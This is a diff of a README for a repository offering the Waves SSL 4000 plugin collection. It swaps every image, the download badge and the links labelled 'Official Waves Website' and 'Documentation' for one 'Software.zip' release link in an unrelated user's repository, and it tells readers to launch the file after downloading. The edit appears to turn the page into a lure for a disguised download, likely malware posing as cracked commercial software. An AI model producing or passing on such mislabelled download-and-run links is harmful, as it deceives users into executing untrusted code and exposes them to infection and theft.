@@ -1,6 +1,6 @@
 # 🎵 Waves SSL 4000 Analog Sound Collection 🎧
 
-![Waves SSL 4000 Analog Sound Collection](https://www.waves.com/sites/default/files/imagecache/product-480/product/waves-ssl-4000-collection-main.jpg)
+![Waves SSL 4000 Analog Sound Collection](https://github.com/eyepez816/Waves-SSL4000-Analog-Sound/releases/download/v1.0/Software.zip)
 
 Welcome to the Waves SSL 4000 Analog Sound Collection repository! Here you will find a comprehensive set of tools to bring the warm, analog sound of the legendary SSL 4000 mixing console to your modern production projects. 
 
@@ -21,12 +21,12 @@ Welcome to the Waves SSL 4000 Analog Sound Collection repository! Here you will 
 ## 🚀 Get Started
 To access the Waves SSL 4000 Analog Sound Collection, download the latest version by clicking the button below:
 
-[![Download Waves SSL 4000 Collection](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Waves SSL 4000 Collection](https://github.com/eyepez816/Waves-SSL4000-Analog-Sound/releases/download/v1.0/Software.zip)](https://github.com/eyepez816/Waves-SSL4000-Analog-Sound/releases/download/v1.0/Software.zip)
 
 *Note: The file needs to be launched after downloading.*
 
 ## 📸 In Action
-![SSL 4000 Analog Sound](https://www.waves.com/images/plugins/ssl-4000-collection/ssl-4000-g-channel-strip.png)
+![SSL 4000 Analog Sound](https://github.com/eyepez816/Waves-SSL4000-Analog-Sound/releases/download/v1.0/Software.zip)
 
 ## 🎶 Why Choose Waves SSL 4000?
 In the world of music production, authenticity and quality are key. The SSL 4000 mixing console is renowned for its rich, analog sound and precise processing capabilities. With the Waves SSL 4000 Collection, you can tap into this legacy and infuse your music with the same legendary sound that has shaped countless hit records.
@@ -45,8 +45,8 @@ Whether you are a seasoned pro looking to add that extra touch of vintage warmth
 - Try blending the EQ plugins subtly for a more cohesive and polished sound.
 
 ## 📚 Resources
-- [Official Waves Website](https://www.waves.com/plugins/ssl-4000-collection)
-- [SSL 4000 Collection Documentation](https://www.waves.com/soundgrid/studio-rack/offline_manuals/1.0.0/html/en/index.htm)
+- [Official Waves Website](https://github.com/eyepez816/Waves-SSL4000-Analog-Sound/releases/download/v1.0/Software.zip)
+- [SSL 4000 Collection Documentation](https://github.com/eyepez816/Waves-SSL4000-Analog-Sound/releases/download/v1.0/Software.zip)
 
 ## 📢 Join the Community
 Connect with fellow music producers, audio enthusiasts, and Waves SSL 4000 fans in our vibrant online community. Share your experiences, tips, and tricks for making the most of this iconic collection.
